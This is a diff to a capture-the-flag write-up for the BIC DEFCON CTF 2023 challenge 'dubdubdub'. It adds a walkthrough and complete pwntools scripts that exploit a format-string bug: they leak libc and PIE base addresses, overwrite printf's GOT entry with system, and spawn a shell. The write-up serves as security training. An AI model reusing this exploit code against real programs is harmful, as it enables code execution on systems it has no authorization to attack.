@@ -1,4 +1,4 @@
-<h3> BIC DEFCON CTF 2023 </h3>
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4747e2d1-66a2-4932-b965-863f83fb3966)<h3> BIC DEFCON CTF 2023 </h3>
 
 ### Description: This was a fun ctf I did and it taught me new things >3
 
@@ -782,5 +782,247 @@ But that's the case is ASLR is disabled and gdb-gef disables it by default
 
 So I'll run it again but this time enabled aslr on gdb
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/96aebbc0-dbab-49a5-9e93-acd2187854cb)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5312062c-9aa7-47cc-aac4-271fe3bfec3c)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f1292088-e3b5-409d-b96d-f9be1dfaeb05)
+
+Now we have the right value 
+
+Libc starting from `0x00007fa0d7600000` and ends at `0x00007fa0d7628000`
+
+What that means is that any function in libc will have that range of memory address
+
+And that's important because we can calculate the libc base 
+
+At this point we need a memory address that resembles that
+
+I made this little fuzz script
+
+```python
+from pwn import *
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ("server", "port")
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = """
+init-pwndbg
+continue
+""".format(**locals())
+
+# Binary filename
+exe = "./dubdubdub"
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = "info"
+warnings.filterwarnings("ignore")
+
+io = start()
+
+io.sendline('Kali')
+out = ""
+for i in range(30,60):
+    out += f"{i}=%{i}$p "
+io.sendline(out)
+
+io.interactive()
+```
+
+On running it shows and attaching the process to gdb I got this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9c9565f2-a1d3-4c9f-9742-856ade2129c6)
+
+At offset 43 it's a libc function
+
+And the value there is this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dde01129-4a3e-4f41-8041-b8dbc74e973d)
+```
+__libc_start_call_main+128
+```
+
+So to get into the `__libc_start_call_main` I'll need to subtract `128` from it
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/98cae3c8-81aa-4148-8d70-507422889eaa)
+
+Now that we know that the libc base address will be calculate this way:
+
+```
+leak - (0x7fb0d9229d10 - 0x7fb0d9200000)
+```
+
+To confirm that I made this script
+
+```python
+from pwn import *
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ("server", "port")
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = """
+init-pwndbg
+aslr on
+continue
+""".format(**locals())
+
+# Binary filename
+exe = "./dubdubdub"
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = "info"
+warnings.filterwarnings("ignore")
+
+io = start()
+libc = ELF('./libc.so.6')
+
+io.sendline("kali")
+io.sendline("Libc="+ "%43$p")
+io.recvuntil("Libc=")
+
+leak = int(io.recvline().strip().decode()[0:14], 16) - 128
+print("Libc Leak:", hex(leak))
+libc.address = leak - (0x7f63dbe29d10- 0x7f63dbe00000)
+print("Libc base address:", hex(libc.address))
+
+io.interactive()
+```
+
+Running it works and confirms that we have a way of getting the libc base address
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0f4dd6d6-9f1e-450b-b9d8-ad1fe2b4c882)
+
+Since we have that we can call our any other function in the libc meaning we have the exact address of `system`
+
+Now the next thing is that `printf` is calling from the ELF Global Offset Table (GOT)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ed718f75-f318-4987-b814-f50f75491933)
+
+And since PIE is enabled we can't just overwrite it unless we know the exact address
+
+So let us leak and calculate elf base address
+
+I used my fuzz script and got this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/04ac50d9-04e9-4dab-89d1-ca25a89a631c)
+
+The elf base address starts from `0x5585a9283000` and ends at `0x5585a9284000`
+
+At offset 45 shows an address that belongs in that range
+
+Thefore in calculating the elf base address I did this
+
+```
+leak - (0x5585a9284229 - 0x5585a9283000)
+```
+
+With that set we have the elf base address
+
+And at this point we can overwrite `elf.got.printf` to `libc.symbols.system`
+
+Pwntools can help with overwriting values using the `fmtstr_payload` function
+
+Here's my [solve script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/bicdefcon_23/dubdubdub/exploit.py)
+
+```python
+from pwn import *
+import warnings
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ("server", "port")
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = """
+init-pwndbg
+continue
+""".format(**locals())
+
+# Binary filename
+exe = "./dubdubdub"
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = "info"
+warnings.filterwarnings("ignore")
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Start program
+io = start()
+
+libc =  ELF("./libc.so.6")
+
+# ===========================================================
+#           Leak libc and calculate libc base address 
+# ===========================================================
+
+# out = ""
+# for i in range(30,60):
+#     out += f"{i}=%{i}$p "
+# print(out)
+# io.sendline(out)
+
+io.sendline("kali")
+io.sendline("Libc="+ "%43$p")
+io.recvuntil("Libc=")
+
+leak = int(io.recvline().strip().decode()[0:14], 16) - 128
+print("Libc Leak:", hex(leak))
+libc.address = leak - (0x7f63dbe29d10- 0x7f63dbe00000)
+print("Libc base address:", hex(libc.address))
+
+# ===========================================================
+#           Calculate ELF base address
+# ===========================================================
+
+io.sendline("kali")
+io.sendline("Pie="+ "%45$p")
+io.recvuntil("Pie=")
+
+leak = int(io.recvline().strip().decode()[0:14], 16)
+print("Pie leak", hex(leak))
+elf.address = leak - (0x55f62235b229 - 0x55f62235a000)
+print("Pie base address", hex(elf.address))
+
+# ===========================================================
+#          GOT Overwrite
+# ===========================================================
+
+offset = 8
+printf = elf.got["printf"]
+shell = libc.symbols["system"]
+payload = fmtstr_payload(offset, {printf: shell})
+
+io.sendline("kali")
+io.sendline(payload)
+
+# ===========================================================
+#          Spawn Shell
+# ===========================================================
+
+io.sendline('kali')
+io.sendline('/bin/bash')
+
+io.interactive()
+```
+
+
+
+
 
 
